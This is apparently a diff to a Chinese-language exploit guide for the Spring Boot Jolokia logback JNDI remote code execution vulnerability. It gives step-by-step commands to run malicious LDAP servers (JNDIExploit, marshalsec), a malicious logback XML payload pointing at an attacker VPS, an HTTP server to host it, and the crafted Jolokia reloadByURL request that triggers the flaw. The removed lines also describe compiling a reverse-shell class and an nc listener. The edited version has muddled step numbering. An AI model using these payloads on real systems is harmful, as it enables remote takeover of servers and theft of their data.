@@ -10,63 +10,37 @@
 ## 利用方法：
 
 ### 步骤一：查看已存在的 MBeans
-
 访问 `/jolokia/list` 接口，查看是否存在 `ch.qos.logback.classic.jmx.JMXConfigurator` 和 `reloadByURL` 关键词。
 
-
-### 步骤二：托管 xml 文件
-
-在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）
-
+### 步骤二：架设恶意ldap服务
+工具：[JNDIExploit-1.4-SNAPSHOT.jar](./file/JNDIExploit.v1.4.zip)
+地址：https://github.com/WhiteHSBG/JNDIExploit
 ```bash
-# 使用 python 快速开启 http server
-
-python2 -m SimpleHTTPServer 80
-python3 -m http.server 80
+java -jar -jar JNDIExploit.jar -i VPS地址
+```
+工具：[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](./file/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar) 
+```bash
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "执行命令" -A VPS地址 
 ```
 
-在根目录放置以 `xml` 结尾的 `example.xml`  文件，内容如下：
-
+### 步骤三：托管xml文件
+example.xml:  
 ```xml
 <configuration>
   <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/JNDIObject" as="appName" />
 </configuration>
 ```
-
-### 步骤三：准备要执行的 Java 代码
-
-编写优化过后的用来反弹 shell 的 [Java 示例代码](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java)  `JNDIObject.java`，
-
-使用兼容低版本 jdk 的方式编译：
-
-```bash
-javac -source 1.5 -target 1.5 JNDIObject.java
+```shell
+# 在xml文件目录开启http服务
+python2 -m SimpleHTTPServer 80
+python3 -m http.server 80
 ```
 
-然后将生成的 `JNDIObject.class` 文件拷贝到 **步骤二** 中的网站根目录。
-
-### 步骤四：架设恶意 ldap 服务
-
-下载 [marshalsec](https://github.com/user-error-404/WIKI-POC/blob/main/Wiki/开发框架漏洞/SpringBoot/jolokia%20logback%20JNDI%20RCE/marshalsec-0.0.3-SNAPSHOT-all.jar) ，使用下面命令架设对应的 ldap 服务：
-
-```bash
-java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
-```
-
-### 步骤五：监听反弹 shell 的端口
-
-一般使用 nc 监听端口，等待反弹 shell
-
-```bash
-nc -lv 443
-```
-
-### 步骤六：从外部 URL 地址加载日志配置文件
-
-替换实际的 your-vps-ip 地址访问 URL 触发漏洞：
+### 步骤三：从外部 URL 地址加载日志配置文件
+替换实际的 VPS地址 访问 URL 触发漏洞：
 
 ```
-/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
+/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/vps地址!/example.xml
 ```
 > ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。
 
